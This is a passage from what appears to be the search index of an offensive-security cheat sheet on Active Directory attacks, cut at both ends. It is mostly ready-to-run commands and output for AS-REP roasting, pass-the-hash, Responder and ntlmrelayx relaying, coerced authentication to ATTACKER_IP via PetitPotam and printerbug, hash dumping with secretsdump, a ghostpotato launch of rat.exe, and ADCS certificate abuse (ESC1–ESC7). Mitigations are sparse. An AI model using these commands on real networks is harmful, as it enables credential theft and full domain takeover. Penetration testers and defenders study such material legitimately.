Target Domain          : testlab.local\n[*] SamAccountName         : TestOU3user\n[*] DistinguishedName      : CN=TestOU3user,OU=TestOU3,OU=TestOU2,OU=TestOU1,DC=testlab,DC=local\n[*] Using domain controller: testlab.local (192.168.52.100)\n[*] Building AS-REQ (w/o preauth) for: 'testlab.local\\TestOU3user'\n[*] Connecting to 192.168.52.100:88\n[*] Sent 169 bytes\n[*] Received 1437 bytes\n[+] AS-REQ w/o preauth successful!\n[*] AS-REP hash:\n$krb5asrep$TestOU3user@testlab.local:858B6F645D9F9B57210292E5711E0...(snip)...\n</code></pre></p> </li> <li> <p>GetNPUsers from Impacket Suite   <pre><code>$ python GetNPUsers.py htb.local/svc-alfresco -no-pass\n[*] Getting TGT for svc-alfresco\n$krb5asrep$23$svc-alfresco@HTB.LOCAL:c13528009a59be0a634bb9b8e84c88ee$cb8e87d02bd0ac7a[...]e776b4\n# extract hashes\nroot@kali:impacket-examples$ python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast\nroot@kali:impacket-examples$ python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast\n</code></pre></p> </li> <li> <p>CrackMapExec Module   <pre><code>$ crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --asreproast output.txt\nLDAP        10.0.2.11       389    dc01           $krb5asrep$23$john.doe@LAB.LOCAL:5d1f750[...]2a6270d7$096fc87726c64e545acd4687faf780[...]13ea567d5\n</code></pre></p> </li> </ul> <p>Using <code>hashcat</code> or <code>john</code> to crack the ticket.</p> <pre><code># crack AS_REP messages with hashcat\nroot@kali:impacket-examples$ hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt \nroot@windows:hashcat$ hashcat64.exe -m 18200 '&lt;AS_REP-hash&gt;' -a 0 c:\\wordlists\\rockyou.txt\n# crack AS_REP messages with john\nC:\\Rubeus&gt; john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast\n</code></pre> <p>Mitigations:  * All accounts must have \"Kerberos Pre-Authentication\" enabled (Enabled by Default).</p>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#pass-the-hash","title":"Pass-the-Hash","text":"<p>The types of hashes you can use with Pass-The-Hash are NT or NTLM hashes. Since Windows Vista, attackers have been unable to pass-the-hash to local admin accounts that weren\u2019t the built-in RID 500.</p> <ul> <li>Metasploit   <pre><code>use exploit/windows/smb/psexec\nset RHOST 10.2.0.3\nset SMBUser jarrieta\nset SMBPass nastyCutt3r  \n# NOTE1: The password can be replaced by a hash to execute a `pass the hash` attack.\n# NOTE2: Require the full NT hash, you may need to add the \"blank\" LM (aad3b435b51404eeaad3b435b51404ee)\nset PAYLOAD windows/meterpreter/bind_tcp\nrun\nshell\n</code></pre></li> <li>CrackMapExec   <pre><code>cme smb 10.2.0.2/24 -u jarrieta -H 'aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d' -x \"whoami\"\n</code></pre></li> <li>Impacket suite   <pre><code>proxychains python ./psexec.py jarrieta@10.2.0.2 -hashes :489a04c09a5debbc9b975356693e179d\n</code></pre></li> <li>Windows RDP and mimikatz   <pre><code>sekurlsa::pth /user:Administrator /domain:contoso.local /ntlm:b73fdfe10e87b4ca5c0d957f81de6863\nsekurlsa::pth /user:&lt;user name&gt; /domain:&lt;domain name&gt; /ntlm:&lt;the users ntlm hash&gt; /run:\"mstsc.exe /restrictedadmin\"\n</code></pre></li> </ul> <p>You can extract the local SAM database to find the local administrator hash :</p> <pre><code>C:\\&gt; reg.exe save hklm\\sam c:\\temp\\sam.save\nC:\\&gt; reg.exe save hklm\\security c:\\temp\\security.save\nC:\\&gt; reg.exe save hklm\\system c:\\temp\\system.save\n$ secretsdump.py -sam sam.save -security security.save -system system.save LOCAL\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#overpass-the-hash-pass-the-key","title":"OverPass-the-Hash (pass the key)","text":"<p>In this technique, instead of passing the hash directly, we use the NT hash of an account to request a valid Kerberost ticket (TGT).</p>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#using-impacket","title":"Using impacket","text":"<pre><code>root@kali:~$ python ./getTGT.py -hashes \":1a59bd44fe5bec39c44c8cd3524dee\" lab.ropnop.com\nroot@kali:~$ export KRB5CCNAME=\"/root/impacket-examples/velociraptor.ccache\"\nroot@kali:~$ python3 psexec.py \"jurassic.park/velociraptor@labwws02.jurassic.park\" -k -no-pass\n\n# also with the AES Key if you have it\nroot@kali:~$ ./getTGT.py -aesKey xxxxxxxxxxxxxxkeyaesxxxxxxxxxxxxxxxx lab.ropnop.com\n\nroot@kali:~$ ktutil -k ~/mykeys add -p tgwynn@LAB.ROPNOP.COM -e arcfour-hma-md5 -w 1a59bd44fe5bec39c44c8cd3524dee --hex -V 5\nroot@kali:~$ kinit -t ~/mykers tgwynn@LAB.ROPNOP.COM\nroot@kali:~$ klist\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#using-rubeus","title":"Using Rubeus","text":"<pre><code># Request a TGT as the target user and pass it into the current session\n# NOTE: Make sure to clear tickets in the current session (with 'klist purge') to ensure you don't have multiple active TGTs\n.\\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /ptt\n# More stealthy variant, but requires the AES256 hash\n.\\Rubeus.exe asktgt /user:Administrator /aes256:[AES256HASH] /opsec /ptt\n# Pass the ticket to a sacrificial hidden process, allowing you to e.g. steal the token from this process (requires elevation)\n.\\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /createnetonly:C:\\Windows\\System32\\cmd.exe\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#capturing-and-cracking-net-ntlmv1ntlmv1-hashes","title":"Capturing and cracking Net-NTLMv1/NTLMv1 hashes","text":"<p>Net-NTLM (NTLMv1) hashes are used for network authentication (they are derived from a challenge/response algorithm and are based on the user's NT hash. </p> <p> : Coerce a callback using PetitPotam or SpoolSample on an affected machine and downgrade the authentication to NetNTLMv1 Challenge/Response authentication. This uses the outdated encryption method DES to protect the NT/LM Hashes.</p> <p>Requirements: * LmCompatibilityLevel = 0x1: Send LM &amp; NTLM (<code>reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v lmcompatibilitylevel</code>)</p> <p>Exploitation: * Capturing using Responder: Edit the <code>/etc/responder/Responder.conf</code> file to include the magical 1122334455667788 challenge     <pre><code>HTTPS = On\nDNS = On\nLDAP = On\n...\n; Custom challenge.\n; Use \"Random\" for generating a random challenge for each requests (Default)\nChallenge = 1122334455667788\n</code></pre> * Fire Responder: <code>responder -I eth0 --lm</code>, if <code>--disable-ess</code> is set, extended session security will be disabled for NTLMv1 authentication * Force a callback:     <pre><code>PetitPotam.exe Responder-IP DC-IP # Patched around August 2021\nPetitPotam.py -u Username -p Password -d Domain -dc-ip DC-IP Responder-IP DC-IP # Not patched for authenticated users\n</code></pre> * If you got some <code>NTLMv1 hashes</code>, you need to format them to submit them on crack.sh <pre><code>username::hostname:response:response:challenge -&gt; NTHASH:response\nNTHASH:F35A3FE17DCB31F9BE8A8004B3F310C150AFA36195554972\n</code></pre> * Or crack them with Hashcat / John The Ripper     <pre><code>john --format=netntlm hash.txt\nhashcat -m 5500 -a 3 hash.txt\n</code></pre> * Now you can DCSync using the Pass-The-Hash with the DC machine account</p> <p> NTLMv1 with SSP(Security Support Provider) changes the server challenge and is not quite ideal for the attack, but it can be used.</p> <p>Mitigations: </p> <ul> <li>Set the Lan Manager authentication level to <code>Send NTLMv2 responses only. Refuse LM &amp; NTLM</code></li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#capturing-and-cracking-net-ntlmv2ntlmv2-hashes","title":"Capturing and cracking Net-NTLMv2/NTLMv2 hashes","text":"<p>If any user in the network tries to access a machine and mistype the IP or the name, Responder will answer for it and ask for the NTLMv2 hash to access the resource. Responder will poison <code>LLMNR</code>, <code>MDNS</code> and <code>NETBIOS</code> requests on the network.</p> <pre><code># https://github.com/lgandx/Responder\n$ sudo ./Responder.py -I eth0 -wfrd -P -v\n# https://github.com/Kevin-Robertson/InveighZero\nPS &gt; .\\inveighzero.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6 Y -LLMNRv6 Y [-Elevated N]\n# https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Invoke-Inveigh.ps1\nPS &gt; Invoke-Inveigh [-IP '10.10.10.10'] -ConsoleOutput Y -FileOutput Y -NBNS Y \u2013mDNS Y \u2013Proxy Y -MachineAccounts Y\n</code></pre> <p>Crack the hashes with Hashcat / John The Ripper</p> <pre><code>john --format=netntlmv2 hash.txt\nhashcat -m 5600 -a 3 hash.txt\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#man-in-the-middle-attacks-relaying","title":"Man-in-the-Middle attacks &amp; relaying","text":"<p>NTLMv1 and NTLMv2 can be relayed to connect to another machine.</p> Hash Hashcat Attack method LM <code>3000</code> crack/pass the hash NTLM/NTHash <code>1000</code> crack/pass the hash NTLMv1/Net-NTLMv1 <code>5500</code> crack/relay attack NTLMv2/Net-NTLMv2 <code>5600</code> crack/relay attack <p>Crack the hash with <code>hashcat</code>.</p> <pre><code>hashcat -m 5600 -a 0 hash.txt crackstation.txt\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#ms08-068-ntlm-reflection","title":"MS08-068 NTLM reflection","text":"<p>NTLM reflection vulnerability in the SMB protocolOnly targeting Windows 2000 to Windows Server 2008.</p> <p>This vulnerability allows an attacker to redirect an incoming SMB connection back to the machine it came from and then access the victim machine using the victim\u2019s own credentials.</p> <ul> <li>https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS08-068</li> </ul> <pre><code>msf &gt; use exploit/windows/smb/smb_relay\nmsf exploit(smb_relay) &gt; show targets\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#smb-signing-disabled-and-ipv4","title":"SMB Signing Disabled and IPv4","text":"<p>If a machine has <code>SMB signing</code>:<code>disabled</code>, it is possible to use Responder with Multirelay.py script to perform an <code>NTLMv2 hashes relay</code> and get a shell access on the machine. Also called LLMNR/NBNS Poisoning</p> <ol> <li>Open the Responder.conf file and set the value of <code>SMB</code> and <code>HTTP</code> to <code>Off</code>.     <pre><code>[Responder Core]\n; Servers to start\n...\nSMB = Off     # Turn this off\nHTTP = Off    # Turn this off\n</code></pre></li> <li>Run <code>python  RunFinger.py -i IP_Range</code> to detect machine with <code>SMB signing</code>:<code>disabled</code>.</li> <li>Run <code>python Responder.py -I &lt;interface_card&gt;</code> </li> <li>Use a relay tool such as <code>ntlmrelayx</code> or <code>MultiRelay</code><ul> <li><code>impacket-ntlmrelayx -tf targets.txt</code> to dump the SAM database of the targets in the list. </li> <li><code>python MultiRelay.py -t &lt;target_machine_IP&gt; -u ALL</code></li> </ul> </li> <li>ntlmrelayx can also act as a SOCK proxy with every compromised sessions.     <pre><code>$ impacket-ntlmrelayx -tf /tmp/targets.txt -socks -smb2support\n[*] Servers started, waiting for connections\nType help for list of commands\nntlmrelayx&gt; socks\nProtocol  Target          Username                  Port\n--------  --------------  ------------------------  ----\nMSSQL     192.168.48.230  VULNERABLE/ADMINISTRATOR  1433\nSMB       192.168.48.230  CONTOSO/NORMALUSER1       445\nMSSQL     192.168.48.230  CONTOSO/NORMALUSER1       1433\n# You might need to select a target with \"-t\"\n# smb://, mssql://, http://, https://, imap://, imaps://, ldap://, ldaps:// and smtp://\nimpacket-ntlmrelayx -t mssql://10.10.10.10 -socks -smb2support\nimpacket-ntlmrelayx -t smb://10.10.10.10 -socks -smb2support\n# the socks proxy can then be used with your Impacket tools or CrackMapExec\n$ proxychains impacket-smbclient //192.168.48.230/Users -U contoso/normaluser1\n$ proxychains impacket-mssqlclient DOMAIN/USER@10.10.10.10 -windows-auth\n$ proxychains crackmapexec mssql 10.10.10.10 -u user -p '' -d DOMAIN -q \"SELECT 1\"   \n</code></pre></li> </ol> <p>Mitigations:</p> <ul> <li>Disable LLMNR via group policy     <pre><code>Open gpedit.msc and navigate to Computer Configuration &gt; Administrative Templates &gt; Network &gt; DNS Client &gt; Turn off multicast name resolution and set to Enabled\n</code></pre></li> <li>Disable NBT-NS     <pre><code>This can be achieved by navigating through the GUI to Network card &gt; Properties &gt; IPv4 &gt; Advanced &gt; WINS and then under \"NetBIOS setting\" select Disable NetBIOS over TCP/IP\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#smb-signing-disabled-and-ipv6","title":"SMB Signing Disabled and IPv6","text":"<p>Since MS16-077 the location of the WPAD file is no longer requested via broadcast protocols, but only via DNS.</p> <pre><code>crackmapexec smb $hosts --gen-relay-list relay.txt\n# DNS takeover via IPv6, mitm6 will request an IPv6 address via DHCPv6\n# -d is the domain name that we filter our request on - the attacked domain\n# -i is the interface we have mitm6 listen on for events\nmitm6 -i eth0 -d $domain\n# spoofing WPAD and relaying NTLM credentials\nimpacket-ntlmrelayx -6 -wh $attacker_ip -of loot -tf relay.txt\nimpacket-ntlmrelayx -6 -wh $attacker_ip -l /tmp -socks -debug\n# -ip is the interface you want the relay to run on\n# -wh is for WPAD host, specifying your wpad file to serve\n# -t is the target where you want to relay to. \nimpacket-ntlmrelayx -ip 10.10.10.1 -wh $attacker_ip -t ldaps://10.10.10.2\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#drop-the-mic","title":"Drop the MIC","text":"<p>The CVE-2019-1040 vulnerability makes it possible to modify the NTLM authentication packets without invalidating the authentication, and thus enabling an attacker to remove the flags which would prevent relaying from SMB to LDAP</p> <p>Check vulnerability with cve-2019-1040-scanner</p> <pre><code>python2 scanMIC.py 'DOMAIN/USERNAME:PASSWORD@TARGET'\n[*] CVE-2019-1040 scanner by @_dirkjan / Fox-IT - Based on impacket by SecureAuth\n[*] Target TARGET is not vulnerable to CVE-2019-1040 (authentication was rejected)\n</code></pre> <ul> <li> <p>Using any AD account, connect over SMB to a victim Exchange server, and trigger the SpoolService bug. The attacker server will connect back to you over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant DCSync privileges to the attacker account. The attacker account can now use DCSync to dump all password hashes in AD     <pre><code>TERM1&gt; python printerbug.py testsegment.local/username@s2012exc.testsegment.local &lt;attacker ip/hostname&gt;\nTERM2&gt; ntlmrelayx.py --remove-mic --escalate-user ntu -t ldap://s2016dc.testsegment.local -smb2support\nTERM1&gt; secretsdump.py testsegment/ntu@s2016dc.testsegment.local -just-dc\n</code></pre></p> </li> <li> <p>Using any AD account, connect over SMB to the victim server, and trigger the SpoolService bug. The attacker server will connect back to you over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant Resource Based Constrained Delegation privileges for the victim server to a computer account under the control of the attacker. The attacker can now authenticate as any user on the victim server.     <pre><code># create a new machine account\nTERM1&gt; ntlmrelayx.py -t ldaps://rlt-dc.relaytest.local --remove-mic --delegate-access -smb2support \nTERM2&gt; python printerbug.py relaytest.local/username@second-dc-server 10.0.2.6\nTERM1&gt; getST.py -spn host/second-dc-server.local 'relaytest.local/MACHINE$:PASSWORD' -impersonate DOMAIN_ADMIN_USER_NAME\n# connect using the ticket\nexport KRB5CCNAME=DOMAIN_ADMIN_USER_NAME.ccache\nsecretsdump.py -k -no-pass second-dc-server.local -just-dc\n</code></pre></p> </li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#ghost-potato-cve-2019-1384","title":"Ghost Potato - CVE-2019-1384","text":"<p>Requirements: * User must be a member of the local Administrators group * User must be a member of the Backup Operators group * Token must be elevated</p> <p>Using a modified version of ntlmrelayx : https://shenaniganslabs.io/files/impacket-ghostpotato.zip</p> <pre><code>ntlmrelayx -smb2support --no-smb-server --gpotato-startup rat.exe\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#remotepotato0-dcom-dce-rpc-relay","title":"RemotePotato0 DCOM DCE RPC relay","text":"<p>It abuses the DCOM activation service and trigger an NTLM authentication of the user currently logged on in the target machine</p> <p>Requirements: - a shell in session 0 (e.g. WinRm shell or SSH shell) - a privileged user is logged on in the session 1 (e.g. a Domain Admin user)</p> <pre><code># https://github.com/antonioCoco/RemotePotato0/\nTerminal&gt; sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:192.168.83.131:9998 &amp; # Can be omitted for Windows Server &lt;= 2016\nTerminal&gt; sudo ntlmrelayx.py -t ldap://192.168.83.135 --no-wcf-server --escalate-user winrm_user_1\nSession0&gt; RemotePotato0.exe -r 192.168.83.130 -p 9998 -s 2\nTerminal&gt; psexec.py 'LAB/winrm_user_1:Password123!@192.168.83.135'\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#dns-poisonning-relay-delegation-with-mitm6","title":"DNS Poisonning - Relay delegation with mitm6","text":"<p>Requirements:  - IPv6 enabled (Windows prefers IPV6 over IPv4) - LDAP over TLS (LDAPS)</p> <p>ntlmrelayx relays the captured credentials to LDAP on the domain controller, uses that to create a new machine account, print the account's name and password and modifies the delegation rights of it.</p> <pre><code>git clone https://github.com/fox-it/mitm6.git \ncd /opt/tools/mitm6\npip install .\nmitm6 -hw ws02 -d lab.local --ignore-nofqnd\n# -d: the domain name that we filter our request on (the attacked domain)\n# -i: the interface we have mitm6 listen on for events\n# -hw: host whitelist\nntlmrelayx.py -ip 10.10.10.10 -t ldaps://dc01.lab.local -wh attacker-wpad\nntlmrelayx.py -ip 10.10.10.10 -t ldaps://dc01.lab.local -wh attacker-wpad --add-computer\n# -ip: the interface you want the relay to run on\n# -wh: WPAD host, specifying your wpad file to serve\n# -t: the target where you want to relay to\n# now granting delegation rights and then do a RBCD\nntlmrelayx.py -t ldaps://dc01.lab.local --delegate-access --no-smb-server -wh attacker-wpad\ngetST.py -spn cifs/target.lab.local lab.local/GENERATED\\$ -impersonate Administrator  \nexport KRB5CCNAME=administrator.ccache  \nsecretsdump.py -k -no-pass target.lab.local  \n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#relaying-with-webdav-trick","title":"Relaying with WebDav Trick","text":"<p>Example of exploitation where you can coerce machine accounts to authenticate to a host and combine it with Resource Based Constrained Delegation to gain elevated access. It allows attackers to elicit authentications made over HTTP instead of SMB</p> <p>Requirement: *  WebClient service</p> <p>Exploitation: * Disable HTTP in Responder: <code>sudo vi /usr/share/responder/Responder.conf</code> * Generate a Windows machine name: <code>sudo responder -I eth0</code>, e.g: WIN-UBNW4FI3AP0 * Prepare for RBCD against the DC: <code>python3 ntlmrelayx.py -t ldaps://dc --delegate-access -smb2support</code> * Discover WebDAV services     <pre><code>webclientservicescanner 'domain.local'/'user':'password'@'machine'\ncrackmapexec smb 'TARGETS' -d 'domain' -u 'user' -p 'password' -M webdav\nGetWebDAVStatus.exe 'machine'\n</code></pre> * Trigger the authentication to relay to our nltmrelayx: <code>PetitPotam.exe WIN-UBNW4FI3AP0@80/test.txt 10.0.0.4</code>, the listener host must be specified with the FQDN or full netbios name like <code>logger.domain.local@80/test.txt</code>. Specifying the IP results in anonymous auth instead of System.    <pre><code># PrinterBug\ndementor.py -d \"DOMAIN\" -u \"USER\" -p \"PASSWORD\" \"ATTACKER_NETBIOS_NAME@PORT/randomfile.txt\" \"ATTACKER_IP\"\nSpoolSample.exe \"ATTACKER_IP\" \"ATTACKER_NETBIOS_NAME@PORT/randomfile.txt\"\n# PetitPotam\nPetitpotam.py \"ATTACKER_NETBIOS_NAME@PORT/randomfile.txt\" \"ATTACKER_IP\"\nPetitpotam.py -d \"DOMAIN\" -u \"USER\" -p \"PASSWORD\" \"ATTACKER_NETBIOS_NAME@PORT/randomfile.txt\" \"ATTACKER_IP\"\nPetitPotam.exe \"ATTACKER_NETBIOS_NAME@PORT/randomfile.txt\" \"ATTACKER_IP\"\n</code></pre> * Use the created account to ask for a service ticket:      <pre><code>.\\Rubeus.exe hash /domain:purple.lab /user:WVLFLLKZ$ /password:'iUAL)l&lt;i$;UzD7W'\n.\\Rubeus.exe s4u /user:WVLFLLKZ$ /aes256:E0B3D87B512C218D38FAFDBD8A2EC55C83044FD24B6D740140C329F248992D8F /impersonateuser:Administrator /msdsspn:host/pc1.purple.lab /altservice:cifs /nowrap /ptt\nls \\\\PC1.purple.lab\\c$\n# IP of PC1: 10.0.0.4\n</code></pre></p>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#man-in-the-middle-rdp-connections-with-pyrdp-mitm","title":"Man-in-the-middle RDP connections with pyrdp-mitm","text":"<ul> <li>https://github.com/GoSecure/pyrdp</li> <li>https://www.gosecure.net/blog/2018/12/19/rdp-man-in-the-middle-smile-youre-on-camera/</li> <li>Usage <pre><code>pyrdp-mitm.py &lt;IP&gt;\npyrdp-mitp.py &lt;IP&gt;:&lt;PORT&gt; # with custom port\npyrdp-mitm.py &lt;IP&gt; -k private_key.pem -c certificate.pem # with custom key and certificate\n</code></pre></li> <li>Exploitation</li> <li>If Network Level Authentication (NLA) is enabled, you will obtain the client's NetNTLMv2 challenge</li> <li>If NLA is disabled, you will obtain the password in plaintext</li> <li>Other features are available such as keystroke recording</li> <li>Alternatives</li> <li>S3th: https://github.com/SySS-Research/Seth, performs ARP spoofing prior to launching the RDP listener  </li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#active-directory-certificate-services","title":"Active Directory Certificate Services","text":"<ul> <li>Find ADCS Server</li> <li><code>crackmapexec ldap domain.lab -u username -p password -M adcs</code></li> <li><code>ldapsearch -H ldap://dc_IP -x -LLL -D 'CN=&lt;user&gt;,OU=Users,DC=domain,DC=local' -w '&lt;password&gt;' -b \"CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=CONFIGURATION,DC=domain,DC=local\" dNSHostName</code></li> <li>Enumerate AD Enterprise CAs with certutil: <code>certutil.exe -config - -ping</code>, <code>certutil -dump</code></li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#esc1-misconfigured-certificate-templates","title":"ESC1 - Misconfigured Certificate Templates","text":"<p>Domain Users can enroll in the VulnTemplate template, which can be used for client authentication and has ENROLLEE_SUPPLIES_SUBJECT set. This allows anyone to enroll in this template and specify an arbitrary Subject Alternative Name (i.e. as a DA). Allows additional identities to be bound to a certificate beyond the Subject.</p> <p>Requirements: *  Template that allows for AD authentication * ENROLLEE_SUPPLIES_SUBJECT flag * [PKINIT] Client Authentication, Smart Card Logon, Any Purpose, or No EKU (Extended/Enhanced Key Usage) </p> <p>Exploitation: * Use Certify.exe to see if there are any vulnerable templates     <pre><code>Certify.exe find /vulnerable\nCertify.exe find /vulnerable /currentuser\n# or\nPS&gt; Get-ADObject -LDAPFilter '(&amp;(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=lab,DC=local'\n# or\ncertipy 'domain.local'/'user':'password'@'domaincontroller' find -bloodhound\n</code></pre> * Use Certify, Certi or Certipy to request a Certificate and add an alternative name (user to impersonate)     <pre><code># request certificates for the machine account by executing Certify with the \"/machine\" argument from an elevated command prompt.\nCertify.exe request /ca:dc.domain.local\\domain-DC-CA /template:VulnTemplate /altname:domadmin\ncerti.py req 'contoso.local/Anakin@dc01.contoso.local' contoso-DC01-CA -k -n --alt-name han --template UserSAN\ncertipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -alt 'administrator@corp.local'\n</code></pre> * Use OpenSSL and convert the certificate, do not enter a password     <pre><code>openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx\n</code></pre> * Move the cert.pfx to the target machine filesystem and request a TGT for the altname user using Rubeus     <pre><code>Rubeus.exe asktgt /user:domadmin /certificate:C:\\Temp\\cert.pfx\n</code></pre></p> <p>WARNING: These certificates will still be usable even if the user or computer resets their password!</p> <p>NOTE: Look for EDITF_ATTRIBUTESUBJECTALTNAME2, CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT, ManageCA flags, and NTLM Relay to AD CS HTTP Endpoints.</p>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#esc2-misconfigured-certificate-templates","title":"ESC2 - Misconfigured Certificate Templates","text":"<p>Requirements: *  Allows requesters to specify a Subject Alternative Name (SAN) in the CSR as well as allows Any Purpose EKU (2.5.29.37.0)</p> <p>Exploitation: * Find template   <pre><code>PS &gt; Get-ADObject -LDAPFilter '(&amp;(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))' -SearchBase 'CN=Configuration,DC=megacorp,DC=local'\n</code></pre> * Request a certificate specifying the <code>/altname</code> as a domain admin like in ESC1.</p>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#esc3-misconfigured-enrollment-agent-templates","title":"ESC3 - Misconfigured Enrollment Agent Templates","text":"<p>ESC3 is when a certificate template specifies the Certificate Request Agent EKU (Enrollment Agent). This EKU can be used to request certificates on behalf of other users</p> <ul> <li>Request a certificate based on the vulnerable certificate template ESC3.   <pre><code>$ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC3'\n[*] Saved certificate and private key to 'john.pfx'\n</code></pre></li> <li>Use the Certificate Request Agent certificate (-pfx) to request a certificate on behalf of other another user    <pre><code>$ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\\administrator' -pfx 'john.pfx'\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#esc4-access-control-vulnerabilities","title":"ESC4 - Access Control Vulnerabilities","text":"<p>Enabling the <code>mspki-certificate-name-flag</code> flag for a template that allows for domain authentication, allow attackers to \"push a misconfiguration to a template leading to ESC1 vulnerability</p> <ul> <li>Search for <code>WriteProperty</code> with value <code>00000000-0000-0000-0000-000000000000</code> using modifyCertTemplate <pre><code>python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -get-acl\n</code></pre></li> <li>Add the <code>ENROLLEE_SUPPLIES_SUBJECT</code> (ESS) flag to perform ESC1   <pre><code>python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -add enrollee_supplies_subject -property mspki-Certificate-Name-Flag\n# Add/remove ENROLLEE_SUPPLIES_SUBJECT flag from the WebServer template. \nC:\\&gt;StandIn.exe --adcs --filter WebServer --ess --add\n</code></pre></li> <li>Perform ESC1 and then restore the value   <pre><code>python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -value 0 -property mspki-Certificate-Name-Flag\n</code></pre></li> </ul> <p>Using Certipy</p> <pre><code># overwrite the configuration to make it vulnerable to ESC1\ncertipy template 'corp.local/johnpc$@ca.corp.local' -hashes :fc525c9683e8fe067095ba2ddc971889 -template 'ESC4' -save-old\n# request a certificate based on the ESC4 template, just like ESC1.\ncertipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC4' -alt 'administrator@corp.local'\n# restore the old configuration\ncertipy template 'corp.local/johnpc$@ca.corp.local' -hashes :fc525c9683e8fe067095ba2ddc971889 -template 'ESC4' -configuration ESC4.json\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#esc6-editf_attributesubjectaltname2","title":"ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2","text":"<p>If this flag is set on the CA, any request (including when the subject is built from Active Directory) can have user defined values in the subject alternative name. </p> <p>Exploitation: * Use Certify.exe to check for UserSpecifiedSAN flag state which refers to the <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> flag.     <pre><code>Certify.exe cas\n</code></pre> * Request a certificate for a template and add an altname, even though the default <code>User</code> template doesn't normally allow to specify alternative names     <pre><code>.\\Certify.exe request /ca:dc.domain.local\\domain-DC-CA /template:User /altname:DomAdmin\n</code></pre></p> <p>Mitigation:  * Remove the flag : <code>certutil.exe -config \"CA01.domain.local\\CA01\" -setreg \"policy\\EditFlags\" -EDITF_ATTRIBUTESUBJECTALTNAME2</code></p>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#esc7-vulnerable-certificate-authority-access-control","title":"ESC7 - Vulnerable Certificate Authority Access Control","text":"<p>Exploitation: * Detect CAs that allow low privileged users the <code>ManageCA</code>  or <code>Manage Certificates</code> permissions     <pre><code>Certify.exe find /vulnerable\n</code></pre> * Change the CA settings to enable the SAN extension for all the templates under the vulnerable CA (ESC6)     <pre><code>Certify.exe setconfig /enablesan /restart\n</code></pre> * Request the certificate with the desired SAN.     <pre><code>Certify.exe request /template:User /altname:super.adm\n</code></pre> * Grant approval if required or disable the approval requirement     <pre><code># Grant\nCertify.exe issue /id:[REQUEST ID]\n# Disable\nCertify.exe setconfig /removeapproval /restart\n</code></pre></p> <p>Alternative exploitation from ManageCA to RCE on ADCS server: </p> <pre><code># Get the current CDP list. Useful to find remote writable shares:\nCertify.exe writefile 